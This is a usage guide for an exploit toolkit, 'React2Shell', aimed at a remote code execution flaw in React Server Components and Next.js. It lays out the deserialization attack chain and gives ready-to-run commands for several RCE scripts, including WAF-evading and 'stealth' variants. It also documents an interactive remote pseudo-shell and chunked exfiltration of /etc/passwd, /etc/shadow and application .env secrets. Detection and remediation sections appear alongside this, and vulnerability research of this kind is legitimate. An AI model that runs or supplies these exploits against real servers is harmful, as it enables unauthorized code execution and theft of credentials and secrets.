# React2Shell - Usage Guide

Exploit scripts and tools for CVE-2025-55182 / CVE-2025-66478.

**For authorized security testing and educational purposes only.**

> For a full vulnerability explanation, see **[README.md](README.md)**.

## Overview

This document covers the exploit scripts, detection tools, and vulnerable test server included in this repository.

| CVE | Component | Severity |
|-----|-----------|----------|
| CVE-2025-55182 | React RSC (`react-server-dom-*`) | Critical |
| CVE-2025-66478 | Next.js (App Router) | Critical |

## Quick Start

```bash
# 1. Start the vulnerable server
cd vulnerable-next-server
pnpm install
pnpm dev
# Server runs on http://localhost:3443

# 2. In another terminal, test detection
chmod +x *.sh
./detect.sh http://localhost:3443

# 3. Run the exploit with stdout capture (recommended - HTTP 303)
./exploit-redirect.sh http://localhost:3443 "id"
./exploit-redirect.sh http://localhost:3443 "cat /etc/passwd"

# 4. Or use throw mode (HTTP 500, dev mode only)
./exploit-throw.sh http://localhost:3443 "id"

# 5. Or run blind exploit (output appears in server terminal only)
./exploit-blind.sh http://localhost:3443 "whoami"

# 6. Enumerate action IDs (needed for URL-encoded/reflect modes)
./enumerate-actions.sh http://localhost:3443

# 7. URL-encoded mode (different WAF signature, requires action ID)
./exploit-urlencoded.sh http://localhost:3443 "ACTION_ID" "id"

# 8. Stealth mode (HTTP 200, requires action ID + echo-style action)
./exploit-reflect.sh http://localhost:3443 "ACTION_ID" "id"

# 9. Interactive shell (recommended for exploration)
./shell.sh http://localhost:3443

# 10. Exfiltrate a file (auto-chunks large files)
./exfil-file.sh http://localhost:3443 /etc/passwd ./passwd.txt
```

## Affected Versions

### React RSC Libraries (vulnerable)

- `react-server-dom-webpack`: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- `react-server-dom-parcel`: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- `react-server-dom-turbopack`: 19.0.0, 19.1.0, 19.1.1, 19.2.0

### Next.js (vulnerable when using App Router)

- 15.x (prior to 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7)
- 16.x (prior to 16.0.7)
- 14.3.0-canary.77+ with App Router/PPR

### Not Affected

- Next.js 13.x
- Next.js 14.x stable (non-canary)
- Pages Router-only applications
- Edge runtime deployments

## Vulnerability Explanation

### The Flight Protocol

React Server Components use a protocol called "Flight" for serializing data between client and server. The protocol:

1. Parses incoming multipart payloads
2. Builds a table of "models" (JSON objects)
3. Resolves references like `"$1:a:b"` → `model[1].a.b`

### Root Cause

In vulnerable versions, the colon-delimited path resolution **does not validate property existence**:

```javascript
// Vulnerable code pattern
for (let i = 1; i < path.length; i++) {
  value = value[path[i]];  // No hasOwnProperty check!
}
```

This allows traversing to `__proto__` and reaching the `Function` constructor via `__proto__:constructor:constructor`.

### Attack Chain

```
1. Attacker sends POST with Next-Action header + multipart payload

2. Payload contains:
   - Part 0: Crafted "fake chunk" with prototype hijack
   - Part 1: "$@0" (raw chunk reference)

3. Deserialization process:
   a. "$1:__proto__:then" → accesses Chunk.prototype.then
   b. Fake chunk triggers initializeModelChunk()
   c. _response._formData.get points to Function constructor
   d. _response._prefix contains attacker code

4. Function constructor creates function from attacker string

5. Function is awaited (as thenable) → code executes
```

### Key Insight

The vulnerability triggers during **deserialization**, before any action validation. Setting `Next-Action: x` (any value) is sufficient to reach the vulnerable code path.

## Files

| File | Description |
|------|-------------|
| `exploit-redirect.sh` | **RCE with stdout** - HTTP 303, output in header (recommended) |
| `exploit-throw.sh` | RCE with stdout - HTTP 500, dev mode only |
| `exploit-blind.sh` | Blind RCE - output in server terminal only |
| `exploit-urlencoded.sh` | URL-encoded variant - different WAF signature |
| `exploit-reflect.sh` | Stealth RCE - HTTP 200, requires action ID |
| `enumerate-actions.sh` | Discovers valid action IDs from target |
| `detect.sh` | Non-destructive vulnerability probe |
| `exfil-file.sh` | Chunked file exfiltration (auto-handles large files) |
| `shell.sh` | Interactive pseudo-shell over RCE |
| `vulnerable-next-server/` | Pre-configured Next.js 16.0.6 + React 19.2.0 |
| `deps/` | React 19.2.0 + Next.js 16.0.6 source (git submodules) |
| `EXPLOIT_NOTES.md` | Detailed exploit chain analysis with code references |

### Exploit Comparison

| Script | stdout | HTTP | Action ID | Production |
|--------|--------|------|-----------|------------|
| `exploit-redirect.sh` | Header | 303 | No | **Works** |
| `exploit-throw.sh` | Body | 500 | No | Broken |
| `exploit-blind.sh` | Server-side | 200 | No | **Works** |
| `exploit-urlencoded.sh` | Header | 303 | **Yes** | **Works** |
| `exploit-reflect.sh` | Body | 200 | **Yes** | **Works** |

**Recommendation:** Use `exploit-redirect.sh` for data exfiltration (works in production, no prerequisites).

### Production vs Development

- **Redirect mode** works in production - output is in the `digest` property (not sanitized)
- **Throw mode** is dev-only - production builds strip error `message` to just `{digest}`
- **Reflect mode** works in production - normal model values aren't sanitized

## Detection

The `detect.sh` script uses the high-fidelity detection mechanism from Searchlight/Assetnote:

```bash
./detect.sh http://target:3000
```

**Detection logic:**
- Sends `["$1:a:a"]` referencing an empty object `{}`
- Vulnerable: `{}.a.a` → `(undefined).a` → throws → HTTP 500 + `E{"digest"`
- Patched: `hasOwnProperty` check prevents crash

**Signature of vulnerable server:**
- HTTP status code: 500
- Response contains: `E{"digest"`
- Content-Type: `text/x-component`

## File Exfiltration

The `exfil-file.sh` script handles large file exfiltration by automatically chunking:

```bash
# Basic usage - output to stdout
./exfil-file.sh http://localhost:3443 /etc/passwd

# Save to local file
./exfil-file.sh http://localhost:3443 /etc/passwd ./passwd.txt

# Exfiltrate application secrets
./exfil-file.sh https://target.com /app/.env ./env.txt
```

**How it works:**
1. Attempts "quick exfil" (single `cat` request) for small files
2. If file exceeds ~6KB header limit, switches to chunked mode
3. Uses `dd` to extract 6KB chunks sequentially
4. Reassembles chunks locally

**Configuration:**
```bash
# Override chunk size (default: 6000 bytes)
CHUNK_SIZE=4000 ./exfil-file.sh http://target /var/log/large.log
```

## Interactive Shell

The `shell.sh` script provides a pseudo-interactive shell experience:

```bash
./shell.sh http://localhost:3443
```

**Features:**
- Tracks working directory between commands (`cd` works)
- Command history (saved to `~/.react2shell_history`)
- Colored prompt showing user@host:cwd
- Built-in `download` command for file exfiltration
- Local command execution with `!` prefix

**Built-in commands:**
| Command | Description |
|---------|-------------|
| `cd <dir>` | Change directory (state persists) |
| `download <file> [local]` | Download file using exfil-file.sh |
| `!<cmd>` | Run command locally |
| `help` | Show help |
| `exit` / `quit` | Exit shell |

**Example session:**
```
$ ./shell.sh http://localhost:3443
Connected!
  User: www-data
  Host: web-server-1
  CWD:  /app

www-data@web-server-1:/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@web-server-1:/app$ cd /etc
www-data@web-server-1:/etc$ cat passwd | head -5
root:x:0:0:root:/root:/bin/bash
...

www-data@web-server-1:/etc$ download shadow ./shadow.txt
[*] Downloading: /etc/shadow -> ./shadow.txt
[+] Saved to: ./shadow.txt

www-data@web-server-1:/etc$ exit
Goodbye!
```

**Note:** Each command is a separate HTTP request. The shell maintains state client-side and prepends `cd $CWD &&` to each command.

## Source Code Analysis

Vulnerable source code is available as git submodules in `deps/`:

| Package | Version | Path |
|---------|---------|------|
| React | v19.2.0 | `deps/react/` |
| Next.js | v16.0.6 | `deps/next.js/` |

**Clone with submodules:**
```bash
git clone --recurse-submodules https://github.com/freeqaz/react2shell
# Or if already cloned:
git submodule update --init --recursive
```

**Key source files:**

| File | Purpose |
|------|---------|
| `deps/react/packages/react-server/src/ReactFlightReplyServer.js` | Vulnerable deserializer |
| `deps/react/packages/react-client/src/ReactFlightClient.js` | Client-side Flight parser |
| `deps/next.js/packages/next/src/server/app-render/action-handler.ts` | Server Action entry point |

See `EXPLOIT_NOTES.md` for detailed line-by-line analysis of the vulnerability.

## Remediation

### Upgrade Immediately

**React RSC:**
- Upgrade to 19.0.1, 19.1.2, or 19.2.1

**Next.js:**
- 15.x → Upgrade to 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, or 15.5.7
- 16.x → Upgrade to 16.0.7+
- Canary → Upgrade to 15.6.0-canary.58+

### Temporary Mitigations

If immediate upgrade is not possible:

1. **Disable RSC/App Router** - Fall back to Pages Router
2. **Restrict access** - Put vulnerable apps behind VPN/SSO
3. **WAF rules** - Block requests with `Next-Action` header from untrusted sources

**Note:** There is no configuration flag that reliably disables the vulnerable code path. Upgrade is the only complete fix.

## References

- [NVD - CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [Next.js Security Advisory - CVE-2025-66478](https://nextjs.org/blog/CVE-2025-66478)
- [React Security Blog Post](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [Searchlight/Assetnote Detection Mechanism](https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478/)
- [msanft/CVE-2025-55182 Analysis](https://github.com/msanft/CVE-2025-55182)
- [React Patch Commit](https://github.com/facebook/react/pull/35277/commits/e2fd5dc6ad973dd3f220056404d0ae0a8707998d)

## Disclaimer

This project is for **authorized security testing and educational purposes only**.

- Only test against systems you own or have explicit permission to test
- Do not use against production systems without authorization
- The authors are not responsible for misuse of this information

Understanding vulnerabilities helps defenders protect their systems. Always practice responsible disclosure.
